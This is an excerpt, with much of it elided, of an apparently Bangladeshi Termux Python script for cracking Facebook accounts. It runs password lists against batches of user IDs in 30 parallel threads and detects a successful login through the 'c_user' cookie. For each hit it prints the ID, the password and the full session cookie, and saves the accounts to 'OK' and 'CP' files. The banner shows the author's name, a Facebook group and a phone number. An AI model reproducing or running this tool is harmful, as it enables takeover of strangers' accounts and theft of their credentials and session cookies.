...
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mMADE BY.    : ARIYAN HRIDOYE 
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB.         : ARIYAN HRIDOYE 
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUp    : BD ISLAMIC TERMUX HELPING ZON
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWHATS APP   : 01790210942
\033[1;90m══════════════════════════════════════════════════""")
class Main:
    def __init__(self):
        self.id = []
...
def num():
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        print("\033[38;5;46m■■■■■♤HRIDOYE♤■■■■■■     \033[38;5;46m  └━━━━━━━━━━━━━━━━┘\n")
        print(f" \033[38;5;46m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••")
        for guru in user:
    ...
    print(' [+] Ids saved in HRIDOYE-ok.txt,HRIDOYE-cp.txt')
...
def gml():
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        print(logo)
        tl = str(len(user))
        print(' \033[38;5;46m[+] HRIDOYE{{{𝙄𝘿𝙎}}}:\033[38;5;46m '+tl)
        print(f" \033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥")
        print("\033[38;5;46m┌━━━━━━━━━━━━━━━┐        \033[38;5;46m┌━━━━━━━━━━━━━━━━┐")
    ...
    print(' [+] \033[38;5;46mIds saved in HRIDOYE-ok.txt,HRIDOYE-cp.txt')
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92m[\033[38;5;46mHRIDOYE]\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[HRIDOYE-OK🐼] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[HRIDOYE-CP🍾] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[38;5;46m[HRIDOYE] \033[38;5;46m%s\033[38;5;46m |\033[m[\033[38;5;46mOK:\033[\033[38;5;46m%s\033[38;5;46m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
